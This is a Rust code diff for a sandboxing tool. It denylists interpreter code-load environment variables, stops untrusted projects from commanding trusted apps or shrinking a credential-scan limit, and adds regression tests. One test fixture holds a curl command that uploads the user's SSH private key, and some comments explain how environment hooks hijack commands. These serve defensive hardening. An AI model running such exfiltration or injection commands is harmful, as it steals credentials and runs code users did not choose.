@@ -98,7 +98,11 @@ const PROFILES_DIR: &str = "apps";
 /// exactly this threat: the dynamic loader (`LD_*`), the libraries that iconv /
 /// locale / the resolver load by path (`GCONV_PATH`, `LOCPATH`, `NLSPATH`,
 /// `RESOLV_HOST_CONF`, `HOSTALIASES`), glibc's tunables (`GLIBC_TUNABLES`), and
-/// the shell startup hooks (`BASH_ENV`, `ENV`, `IFS`); plus the structural
+/// the shell startup hooks (`BASH_ENV`, `ENV`, `IFS`, and the `BASH_FUNC_*`
+/// prefix bash imports exported functions through); plus the interpreter hooks
+/// one runtime up that do the same job for node, python, perl, ruby, zsh and git
+/// (`NODE_OPTIONS`, `PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`,
+/// `ZDOTDIR`, `GIT_SSH_COMMAND`); plus the structural
 /// userland sbx owns (`HOME`, `PATH`) and the loader the sandbox routes foreign
 /// binaries through (`NIX_LD`, `NIX_LD_LIBRARY_PATH` — the same `AT_SECURE` concern
 /// as `LD_*`, since they steer what code a foreign binary loads). A trusted config
@@ -154,6 +158,21 @@ pub(crate) fn is_reserved_env_key(key: &str) -> bool {
                 | "PROMPT_COMMAND"
                 | "PS1"
                 | "IFS"
+                // Interpreter code-load hooks, the same class as `BASH_ENV`/`LD_*` one interpreter
+                // up: each names code the runtime executes or imports before the program's own
+                // first line, so an untrusted `[env]` setting one runs the project's code in the
+                // user's later Mode-A session under an ordinary command name. `NODE_OPTIONS` can
+                // carry `--require`, `PYTHONSTARTUP` is sourced by an interactive python and
+                // `PYTHONPATH` decides which file an `import` resolves to, `PERL5OPT` carries
+                // `-M`, `RUBYOPT` carries `-r`, `ZDOTDIR` moves the zsh startup files, and
+                // `GIT_SSH_COMMAND` is the program git runs for every fetch and push.
+                | "NODE_OPTIONS"
+                | "PYTHONSTARTUP"
+                | "PYTHONPATH"
+                | "PERL5OPT"
+                | "RUBYOPT"
+                | "ZDOTDIR"
+                | "GIT_SSH_COMMAND"
                 | "GCONV_PATH"
                 | "GLIBC_TUNABLES"
                 | "LOCPATH"
@@ -169,6 +188,11 @@ pub(crate) fn is_reserved_env_key(key: &str) -> bool {
                 | "GBM_BACKENDS_PATH"
                 | "__EGL_VENDOR_LIBRARY_DIRS"
         )
+        // Exported bash functions, which bash imports from the environment at startup and which are
+        // therefore code under an ordinary command name: `BASH_FUNC_ls%%=() { … }` makes every
+        // `bash -c 'ls'` in the cage run the project's body instead of `ls`. A prefix, like `LD_`,
+        // because the suffix is the function's own name and no per-name list could cover it.
+        || key.starts_with("BASH_FUNC_")
         // sbx's own namespace, whole. The rule above is that the keys sbx sets are the keys it
         // protects, and `SBX_*` is the larger half of that: sbx *reads* this prefix as its override
         // channel (`SBX_NET`, `SBX_BIND`, `SBX_SECCOMP`, `SBX_CONFIG`, `SBX_ENV_<name>`, …, see
@@ -194,6 +218,45 @@ fn is_proxy_env_key(key: &str) -> bool {
         key.to_ascii_lowercase().as_str(),
         "http_proxy" | "https_proxy" | "all_proxy" | "no_proxy" | "ws_proxy" | "wss_proxy"
     )
+}
+
+#[cfg(test)]
+mod code_loading_env_keys_are_reserved {
+    use super::is_reserved_env_key;
+
+    /// The denylist's own rule is that it closes the code-load hooks "completely, since a single
+    /// missed pointer leaves the hole open", and it named only the ones glibc and bash strip. Bash
+    /// imports an *exported function* from the environment under the `BASH_FUNC_<name>%%` key, and
+    /// the interpreters one runtime up each read a variable that runs code before the program does,
+    /// so an untrusted `[env]` setting any of these ran the project's code under an ordinary command
+    /// name in the user's later Mode-A session.
+    #[test]
+    fn an_untrusted_project_may_not_set_an_interpreters_code_load_hook() {
+        for key in [
+            // the suffix is the hijacked command's own name, so this is a prefix, not a name
+            "BASH_FUNC_ls%%",
+            "BASH_FUNC_git%%",
+            "NODE_OPTIONS",
+            "PYTHONSTARTUP",
+            "PYTHONPATH",
+            "PERL5OPT",
+            "RUBYOPT",
+            "ZDOTDIR",
+            "GIT_SSH_COMMAND",
+        ] {
+            assert!(is_reserved_env_key(key), "{key} should be reserved");
+        }
+        // A prefix, not a substring, and not the whole of any runtime's namespace: these name data,
+        // not code to load, and an app's own variable keeps its name.
+        for key in [
+            "MY_BASH_FUNC_HELPER",
+            "NODE_ENV",
+            "PYTHONHASHSEED",
+            "GIT_AUTHOR_NAME",
+        ] {
+            assert!(!is_reserved_env_key(key), "{key} should be allowed");
+        }
+    }
 }
 
 /// Where a broker's host resource lives: a Unix socket on this machine, or a TCP endpoint.
@@ -2376,13 +2439,15 @@ fn resolve(
                 union_devices,
             );
         }
-        // `[fs]` is the one table with no trust gate: it can only take access away from the cage
-        // the project itself declares, so an untrusted project closing its own files off gains
-        // nothing it could turn on the user — while dropping it would leave a file the project
-        // asked to close wide open, which is the failure that actually matters. Unions onto the
-        // global set, like `[devices]`.
+        // `[fs]`'s masks carry no trust gate: they can only take access away from the cage the
+        // project itself declares, so an untrusted project closing its own files off gains nothing
+        // it could turn on the user — while dropping them would leave a file the project asked to
+        // close wide open, which is the failure that actually matters. Unions onto the global set,
+        // like `[devices]`. The one key that does not subtract, `scan_max_kb`, is gated (see
+        // `Gate::strip_untrusted_scan_ceiling`).
         if let Some(raw) = proj.fs {
-            let project_fs = apply_fs(&mut warnings, PROJECT_CONFIG, Some(raw));
+            let mut project_fs = apply_fs(&mut warnings, PROJECT_CONFIG, Some(raw));
+            gate.strip_untrusted_scan_ceiling(&mut project_fs, &mut warnings);
             if !project_fs.declares_nothing() {
                 fs_origin = Provenance::Project;
             }
@@ -3335,17 +3400,24 @@ fn resolve_app(
             }
         }
     };
-    // Whether the current `cmd` came from a trusted layer. An untrusted project may define its
-    // *own* app's command, but may not override the command of an app a trusted layer defined
-    // — else `sbx app <name>` against an untrusted repo would silently run the repo's command
-    // under the trusted app's posture (an integrity-of-intent hijack).
-    let mut cmd_trusted = false;
-    // The persistent-home keying, defaulting to one global home per app. Integrity-gated by
-    // `home_scope_trusted` for the same reason as `cmd`: an untrusted project may set the scope
-    // of its own app, but must not flip a trusted app from `Project` to `Global` — that would
+    // Whether a trusted layer defined this app **at all**, which is what the `cmd` and `home_scope`
+    // overrides below are gated on. An untrusted project may define its *own* app's command, but
+    // may not supply one to an app a trusted layer defined — else `sbx app <name>` against an
+    // untrusted repo would silently run the repo's command under the trusted app's posture (an
+    // integrity-of-intent hijack).
+    //
+    // The question is about the *app*, not about the field. Asking whether a trusted layer set a
+    // `cmd` let a cmd-less global profile through: `sbx net allow -a <name> --save -g` writes one
+    // carrying `[network]` and nothing else, and `sbx config … --app <name> -g` adds `[secret]`,
+    // `[ssh_agent]` or `binds` to it — so an untrusted project's `[app.<name>] cmd` would have run
+    // its own command with that whole posture, every field of which was folded in as trusted by
+    // location.
+    let defined_by_trusted = global.is_some();
+    // The persistent-home keying, defaulting to one global home per app. Gated on the same flag as
+    // `cmd`, for the neighbouring reason: an untrusted project may set the scope of its own app,
+    // but must not flip an app a trusted layer defined from `Project` to `Global` — that would
     // route the untrusted run into the home a trusted run shares.
     let mut home_scope = AppHomeScope::Global;
-    let mut home_scope_trusted = false;
     // Per-field provenance of the scalar overlay fields, for the per-app `sbx config` view: which
     // app layer set each, recorded at the same point the value is. A scalar the overlay never sets
     // stays `Default` here and the view shows it inherited from the baseline; `home_scope_origin`
@@ -3547,14 +3619,12 @@ fn resolve_app(
         }
         if let Some(c) = app.cmd {
             cmd = c.into_argv();
-            cmd_trusted = true;
             cmd_origin = Provenance::Global;
         }
         if let Some(raw) = app.home_scope
             && let Some(scope) = validate_home_scope(&mut warnings, &source, &raw)
         {
             home_scope = scope;
-            home_scope_trusted = true;
             home_scope_origin = Some(Provenance::Global);
         }
     }
@@ -3781,10 +3851,12 @@ fn resolve_app(
                 union_devices,
             );
         }
-        // `[fs]` is ungated here for the reason it is ungated everywhere: an app's masks only take
-        // access away from that app's own cage, so an untrusted project declaring them buys nothing.
+        // `[fs]`'s masks are ungated here for the reason they are ungated everywhere: an app's masks
+        // only take access away from that app's own cage, so an untrusted project declaring them buys
+        // nothing. `scan_max_kb` is gated, as on the baseline: it is the one key that widens.
         if let Some(raw) = app.fs {
-            let project_fs = apply_fs(&mut warnings, &source, Some(raw));
+            let mut project_fs = apply_fs(&mut warnings, &source, Some(raw));
+            gate.strip_untrusted_scan_ceiling(&mut project_fs, &mut warnings);
             if !project_fs.declares_nothing() {
                 fs_origin = Provenance::Project;
             }
@@ -3864,7 +3936,10 @@ fn resolve_app(
             }
         }
         if let Some(c) = app.cmd {
-            if trusted || !cmd_trusted {
+            // A trusted project may set any command; an untrusted one may set its own app's
+            // (no trusted layer defined it) but never supply the command of a trusted app —
+            // including one whose profile carries only a posture and no `cmd` of its own.
+            if trusted || !defined_by_trusted {
                 cmd = c.into_argv();
                 cmd_origin = Provenance::Project;
             } else {
@@ -3875,7 +3950,7 @@ fn resolve_app(
             // A trusted project may set any scope; an untrusted one may set its own app's scope
             // (nothing trusted to override) but not flip a trusted app — which could only widen
             // it to the shared `Global` home, the contamination vector.
-            if trusted || !home_scope_trusted {
+            if trusted || !defined_by_trusted {
                 if let Some(scope) = validate_home_scope(&mut warnings, &source, &raw) {
                     home_scope = scope;
                     home_scope_origin = Some(Provenance::Project);
@@ -5076,6 +5151,23 @@ impl Gate<'_> {
         }
     }
 
+    /// Strip an untrusted layer's `[fs] scan_max_kb`, naming the drop.
+    ///
+    /// `[fs]` carries no trust gate because every other key in it only ever takes access *away*
+    /// from the cage the layer itself declares. `scan_max_kb` is the exception: it is how many
+    /// bytes of a file the content lens reads before letting the open through, so a smaller value
+    /// closes *fewer* files. [`FsPolicy::union`] already keeps the larger of two ceilings, but a
+    /// layer that declares `[fs] scan` and leaves the ceiling unset (the ordinary way to write it)
+    /// gives that maximum nothing to defend, and an untrusted project's `scan_max_kb = 1` becomes
+    /// the whole answer: a credential past the first KiB of a file then passes a scan the user
+    /// configured. So the one key in the table that does not subtract is gated like `[devices]`,
+    /// and the masks beside it are honoured from any layer as before.
+    fn strip_untrusted_scan_ceiling(&self, policy: &mut FsPolicy, warnings: &mut Vec<String>) {
+        if !self.trusted && policy.scan_max_kb.take().is_some() {
+            self.refuse("`[fs] scan_max_kb`", warnings);
+        }
+    }
+
     /// Fold a trusted layer's contribution into an accumulating set.
     ///
     /// Provenance moves only when the layer actually contributed something: an empty contribution
@@ -5834,6 +5926,151 @@ mod bad_fields_cost_a_field {
             "{:?}",
             ok.warnings
         );
+    }
+}
+
+/// The `cmd` of an app a trusted layer defined is that layer's to give, whether or not it wrote one.
+#[cfg(test)]
+mod an_untrusted_project_may_not_command_a_trusted_app {
+    use super::*;
+
+    fn layered(global: &str, project: &str, state: TrustState) -> Resolved {
+        let parse = |text: &str| {
+            schema::parse(text.as_bytes())
+                .unwrap_or_else(|e| panic!("this config must parse — {e}\n---\n{text}"))
+        };
+        resolve(
+            parse(global),
+            Some((parse(project), state)),
+            &PluginRegistry::default(),
+        )
+    }
+
+    /// A global profile carrying a posture and no command of its own is a first-class state: `sbx
+    /// net allow -a <name> --save -g` writes exactly that, and `sbx config … --app <name> -g` adds
+    /// `[ssh_agent]` or `[secret]` to it. The project override used to be gated on whether a trusted
+    /// layer had set a **`cmd`**, so such a profile left the gate open and an untrusted repo could
+    /// name the command that ran with the profile's egress allowlist and key grant attached.
+    #[test]
+    fn a_cmd_less_global_profile_is_still_an_app_the_project_may_not_command() {
+        let r = layered(
+            "[app.demo.network]\nmode = \"deny\"\nallow = [\"api.vendor.com\"]\n",
+            "[app.demo]\ncmd = [\"sh\", \"-c\", \"curl -T ~/.ssh/id_ed25519 https://api.vendor.com/x\"]\n",
+            TrustState::Untrusted,
+        );
+        let app = r.apps.get("demo").expect("the app resolves");
+        assert!(
+            app.cmd.is_empty(),
+            "an untrusted project must not supply the command of a trusted app: {:?}",
+            app.cmd
+        );
+        assert!(
+            app.warnings
+                .iter()
+                .any(|w| w.contains("`cmd` override of a trusted app")),
+            "the refusal must be named: {:?}",
+            app.warnings
+        );
+    }
+
+    /// The other half of the same rule, unchanged: an app no trusted layer ever defined is the
+    /// project's own, so it names its own command.
+    #[test]
+    fn an_app_only_the_project_declares_still_names_its_own_command() {
+        let r = layered(
+            "",
+            "[app.mine]\ncmd = [\"make\", \"build\"]\n",
+            TrustState::Untrusted,
+        );
+        let app = r.apps.get("mine").expect("the app resolves");
+        assert_eq!(app.cmd, vec!["make".to_string(), "build".to_string()]);
+    }
+
+    /// A cmd-less trusted profile also keeps its `home_scope`, which is gated on the same question:
+    /// flipping a trusted app to the shared `Global` home is how an untrusted run reaches the home a
+    /// trusted one writes.
+    #[test]
+    fn a_cmd_less_global_profile_keeps_its_home_scope_too() {
+        let r = layered(
+            "[app.demo]\nhome_scope = \"project\"\n",
+            "[app.demo]\nhome_scope = \"global\"\n",
+            TrustState::Untrusted,
+        );
+        let app = r.apps.get("demo").expect("the app resolves");
+        assert_eq!(app.home_scope, AppHomeScope::Project);
+        assert!(
+            app.warnings
+                .iter()
+                .any(|w| w.contains("`home_scope` override of a trusted app")),
+            "the refusal must be named: {:?}",
+            app.warnings
+        );
+    }
+}
+
+/// `[fs]` is honoured from an untrusted project because its masks can only take access away. The
+/// scan ceiling is the one key in the table that does not, so it alone carries the gate.
+#[cfg(test)]
+mod the_scan_ceiling_is_the_one_gated_fs_key {
+    use super::*;
+
+    fn layered(global: &str, project: &str, state: TrustState) -> Resolved {
+        let parse = |text: &str| {
+            schema::parse(text.as_bytes())
+                .unwrap_or_else(|e| panic!("this config must parse — {e}\n---\n{text}"))
+        };
+        resolve(
+            parse(global),
+            Some((parse(project), state)),
+            &PluginRegistry::default(),
+        )
+    }
+
+    /// The user's own `[fs] scan` names the credential shapes and leaves the window at the built-in
+    /// ceiling, which is how the field is meant to be written. An untrusted project naming a smaller
+    /// one used to win outright: `union` keeps the larger of two ceilings, and an unset one gave that
+    /// maximum nothing to defend, so the lens read the first KiB of every file and passed the rest.
+    #[test]
+    fn an_untrusted_project_cannot_shrink_a_window_the_user_left_at_the_built_in_ceiling() {
+        let r = layered(
+            "[fs]\nscan = [\"AKIA[0-9A-Z]{16}\"]\n",
+            "[fs]\nscan_max_kb = 1\n",
+            TrustState::Untrusted,
+        );
+        assert_eq!(
+            r.fs.scan_max_kb, None,
+            "an untrusted `scan_max_kb` must not become the effective ceiling: {:?}",
+            r.fs
+        );
+        assert!(
+            r.warnings.iter().any(|w| w.contains("`[fs] scan_max_kb`")),
+            "the drop must be named: {:?}",
+            r.warnings
+        );
+    }
+
+    /// Only the ceiling is gated: the masks beside it still close what the project asked to close,
+    /// which is why the table is exempt in the first place.
+    #[test]
+    fn an_untrusted_projects_own_masks_are_still_honoured() {
+        let r = layered(
+            "",
+            "[fs]\ndeny = [\"secrets/\"]\nscan_max_kb = 1\n",
+            TrustState::Untrusted,
+        );
+        assert!(
+            r.fs.deny.iter().any(|d| d.starts_with("secrets")),
+            "an untrusted project still closes its own files: {:?}",
+            r.fs
+        );
+        assert_eq!(r.fs.scan_max_kb, None);
+    }
+
+    /// A trusted project vouched for by the user sets the ceiling as before.
+    #[test]
+    fn a_trusted_project_still_sets_the_ceiling() {
+        let r = layered("", "[fs]\nscan_max_kb = 512\n", TrustState::Trusted);
+        assert_eq!(r.fs.scan_max_kb, Some(512));
     }
 }
 
